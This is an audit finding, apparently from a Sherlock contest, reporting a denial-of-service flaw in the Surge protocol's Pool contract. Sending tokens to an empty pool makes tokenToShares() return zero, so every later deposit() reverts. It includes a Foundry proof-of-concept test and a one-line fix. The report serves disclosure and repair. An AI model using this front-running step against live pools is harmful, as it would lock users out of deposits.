chaduke

medium

# A malicious user can create a DOS attack to deposit()

## Summary
A malicious user can create a DOS attack to deposit(). 

He can accomplish that by manipulating ``_loanTokenBalance`` and ``_currentTotalSupply`` such that function ``tokenToShares()`` will always return zero. As a result, ``deposit()`` will always revert. 

## Vulnerability Detail
A malicious user Bob can initiate a DOS attack to deposit() like this:

1) Bob front-runs all transactions of the protocol and sends 1 loan token to the pool. As a result, ``_loanTokenBalance != 0``, and ``totalSupply = 0``. Now nobody can run ``deposit()`` anymore. 

2) Let's say Alice runs deposit(1000). 
[https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L307-L343](https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L307-L343)

3) At L324, it calls tokenToShares(1000, 1, 0, false) to calculate how many pool shares to return to Alice. 

4) However, the implementation of ``tokenToShares`` has a problem: when ``_supplied != 0`` and ``_sharesTotalSupply == 0``, it will always return ZERO. Therefore,  ``tokenToShares(1000, 1, 0, false)``  will return zero: 

[https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L199-L204](https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L199-L204)

5) As a result, ``deposit()`` will revert on L325. An effective DOS attack to all future deposits.

6) The code POC below confirms my finding:

```javascript
 function testDepositDOS() external {
        uint amount = 1000;
        MockERC20 collateralToken = new MockERC20(0, 18);
        MockERC20 loanToken = new MockERC20(amount, 18);
        Pool pool = factory.deploySurgePool(IERC20(address(collateralToken)), IERC20(address(loanToken)), 1e18, 0.8e18, 1e15, 1e15, 0.1e18, 0.4e18, 0.6e18);
        loanToken.transfer(address(pool), 7);
        assertEq(loanToken.balanceOf(address(pool)), 7);
        assertEq(loanToken.balanceOf(address(this)), 993);
        loanToken.approve(address(pool), 2);
        vm.expectRevert();
        pool.deposit(2);
        loanToken.transfer(address(1), 3);
        loanToken.transfer(address(2), 4);
        vm.prank(address(1));
        loanToken.approve(address(pool), 3);
        vm.prank(address(1));
        vm.expectRevert();
        pool.deposit(3);
        vm.prank(address(2));
        loanToken.approve(address(pool), 4);
        vm.expectRevert();
        pool.deposit(4);
    }   
```

## Impact
A DOS attack to deposit() such that it will always revert. 

## Code Snippet

## Tool used
VSCode, foundry

Manual Review

## Recommendation
We revise the tokenToShares() function as follows:

```diff
 function tokenToShares (uint _tokenAmount, uint _supplied, uint _sharesTotalSupply, bool roundUpCheck) internal pure returns (uint) {
-        if(_supplied == 0) return _tokenAmount;
+       if(_sharesTotalSupply == 0) return _tokenAmount;
        uint shares = _tokenAmount * _sharesTotalSupply / _supplied;
        if(roundUpCheck && shares * _supplied < _tokenAmount * _sharesTotalSupply) shares++;
        return shares;
    }
```
